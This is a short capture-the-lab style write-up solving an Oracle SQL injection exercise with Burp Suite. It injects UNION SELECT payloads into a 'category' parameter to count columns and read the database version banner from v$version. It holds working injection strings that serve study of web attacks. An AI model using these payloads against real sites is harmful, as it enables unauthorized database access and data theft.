---
custom_edit_url: null
sidebar_position: 3
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/dd519b8d-f486-46b3-af19-2d8b67fd6585)
</figure>

Let's filter for `Accessories`.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/a7dacc13-cdf2-4c76-9d94-4f675aafb2da)
</figure>

Since we are proxying the traffic through Burp Suite, we can go to the `Proxy > HTTP History` tab to view this request.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/f8925d03-680c-4ebb-896f-6c6157aebc7a)
</figure>

Let's forward the request to the `Repeater` for further modification.

Once in the `Repeater`, let's set the `category` parameter to the following:

```
' UNION SELECT 'test','test' FROM dual--
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/2787b997-6902-4310-93c7-7bc0faf44ee8)
</figure>

Now that we know there are two columns, we can set the `category` parameter to the following:

```
' UNION SELECT BANNER, NULL FROM v$version--
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/d176ef09-8c9d-43d7-8e4c-10d2cf860d01)
</figure>

We have solved the lab.

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/0b363cc4-f88f-4735-92b6-bc67166545ef)
</figure>
